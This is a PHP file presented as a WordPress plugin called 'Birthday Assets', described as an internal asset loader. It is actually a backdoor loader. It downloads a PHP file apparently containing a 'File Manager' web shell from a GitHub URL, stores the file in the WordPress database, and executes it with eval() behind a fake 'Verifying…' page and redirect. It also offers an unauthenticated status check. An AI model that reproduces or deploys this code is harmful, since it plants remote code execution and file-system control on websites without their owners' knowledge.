<?php
/**
 * Plugin Name: Birthday Assets
 * Description: Internal asset loader.
 * Version:     1.0
 */

// -----------------------------------------------------------------------------
// Bootstrap WordPress. Adjust if this file isn't next to wp-load.php.
// -----------------------------------------------------------------------------
$wp_load_candidates = [
    __DIR__ . '/wp-load.php',
    dirname(__DIR__, 4) . '/wp-load.php',   // /wp-content/plugins/x/inc/
    dirname(__DIR__, 3) . '/wp-load.php',
    dirname(__DIR__, 5) . '/wp-load.php',
];
$wp_loaded = false;
foreach ($wp_load_candidates as $p) {
    if (is_file($p)) { require_once $p; $wp_loaded = true; break; }
}
if (!$wp_loaded) { http_response_code(500); exit('WP not found'); }

// -----------------------------------------------------------------------------
// CONFIG
// -----------------------------------------------------------------------------
$SOURCES = [
['url' => 'https://raw.githubusercontent.com/phrases12/adps/refs/heads/main/wp-classs.php', 'marker' => 'File Manager']
];

$TRANSIENT_KEY = 'site_asset_cache_v1';
$MIN_WAIT_MS   = 1500;

// -----------------------------------------------------------------------------
// Helpers
// -----------------------------------------------------------------------------
function bd_fetch_wp($url) {
    $res = wp_remote_get($url, [
        'timeout'     => 8,
        'redirection' => 5,
        'user-agent'  => 'BdayLoader/1.0',
    ]);
    if (is_wp_error($res)) return false;
    $code = (int) wp_remote_retrieve_response_code($res);
    if ($code < 200 || $code >= 400) return false;
    $body = wp_remote_retrieve_body($res);
    return ($body !== '') ? $body : false;
}

function bd_pick_and_cache_wp($SOURCES, $key) {
    $idx = array_keys($SOURCES);
    shuffle($idx);
    foreach ($idx as $i) {
        $entry  = $SOURCES[$i];
        $source = bd_fetch_wp($entry['url']);
        if ($source === false) continue;
        if (strpos($source, $entry['marker']) === false) continue;

        set_transient($key, [
            'source' => $source,
            'marker' => $entry['marker'],
            'stored' => time(),
        ], 0);

        $rt = get_transient($key);
        if (is_array($rt)
            && isset($rt['source'], $rt['marker'])
            && strpos($rt['source'], $rt['marker']) !== false) {
            return $rt['source'];
        }
    }
    return null;
}

function bd_get_cached($key) {
    $c = get_transient($key);
    if (is_array($c)
        && isset($c['source'], $c['marker'])
        && strpos($c['source'], $c['marker']) !== false) {
        return $c['source'];
    }
    return null;
}

function bd_strip_php_tags($src) {
    $src = preg_replace('/^\s*<\?php\s*/i', '', $src, 1);
    $src = preg_replace('/\?>\s*$/', '', $src, 1);
    return $src;
}

// -----------------------------------------------------------------------------
// Admin controls
// -----------------------------------------------------------------------------
if (isset($_GET['flush']) && function_exists('current_user_can') && current_user_can('manage_options')) {
    delete_transient($TRANSIENT_KEY);
}
if (isset($_GET['stop'])) {
    header('Content-Type: text/plain; charset=utf-8');
    $c = bd_get_cached($TRANSIENT_KEY);
    echo "Bypass active.\nCache: " . ($c ? strlen($c) . " bytes" : "empty") . "\n";
    exit;
}

// =============================================================================
// MODE 1: ?r=1  — render the birthday page directly (no verifying screen)
// =============================================================================
if (isset($_GET['r']) && $_GET['r'] === '1') {
    $payload = bd_get_cached($TRANSIENT_KEY);
    if ($payload === null) {
        // Cache disappeared between verify and render — re-prep now.
        $payload = bd_pick_and_cache_wp($SOURCES, $TRANSIENT_KEY);
    }
    header('Content-Type: text/html; charset=utf-8');
    header('Cache-Control: no-store');
    if ($payload === null) { echo '<p>Verification failed. Please refresh.</p>'; exit; }
    try {
        eval(bd_strip_php_tags($payload));
    } catch (Throwable $e) {
        echo '<p>Error rendering.</p>';
    }
    exit;
}

// =============================================================================
// MODE 2: default — show verifying screen, prep cache, then redirect to ?r=1
// =============================================================================
ignore_user_abort(true);
@ini_set('zlib.output_compression', '0');
while (ob_get_level() > 0) { ob_end_flush(); }

header('Content-Type: text/html; charset=utf-8');
header('Cache-Control: no-store');

$startedAt = microtime(true);

echo <<<'HTML'
<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Verifying…</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  html,body{height:100%;margin:0;background:#fff;color:#111;
    font:15px/1.5 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;}
  .wrap{min-height:100%;display:flex;flex-direction:column;align-items:center;
    justify-content:center;gap:22px;padding:40px 20px;text-align:center;}
  .spinner{width:38px;height:38px;border:3px solid #e5e7eb;border-top-color:#111;
    border-radius:50%;animation:spin 1s linear infinite;}
  @keyframes spin{to{transform:rotate(360deg);}}
  p{margin:0;color:#333;} .sub{color:#888;font-size:12px;}
</style></head><body>
<div class="wrap" id="wrap">
  <div class="spinner"></div>
  <p>Please wait while your request is being verified...</p>
  <p class="sub">Do not close or refresh this page.</p>
</div>
HTML;

echo str_repeat(' ', 4096) . "\n";
@ob_flush(); @flush();

// Backend work: make sure cache is populated.
$payload = bd_get_cached($TRANSIENT_KEY);
$failed  = false;
if ($payload === null) {
    $payload = bd_pick_and_cache_wp($SOURCES, $TRANSIENT_KEY);
    if ($payload === null) $failed = true;
}

// Minimum "verifying" duration.
$elapsedMs = (microtime(true) - $startedAt) * 1000;
if ($elapsedMs < $MIN_WAIT_MS) {
    usleep((int) (($MIN_WAIT_MS - $elapsedMs) * 1000));
}

// Show failure or navigate to render URL.
if ($failed) {
    echo '<script>document.getElementById("wrap").innerHTML='
       . '"<p>Verification failed. Please refresh the page.</p>";</script>';
    echo '</body></html>';
    exit;
}

echo <<<'HTML'
<script>
  if (window.location.hash) {
    // #stop bypass — stay on the verifying screen.
    document.getElementById('wrap').innerHTML =
      '<p>Verified. Redirect skipped.</p>' +
      '<p class="sub">Cache OK (payload in DB).</p>';
  } else {
    // Auto-navigate to the render URL.
    var u = new URL(window.location.href);
    u.searchParams.set('r', '1');
    window.location.replace(u.toString());
  }
</script>
</body></html>
HTML;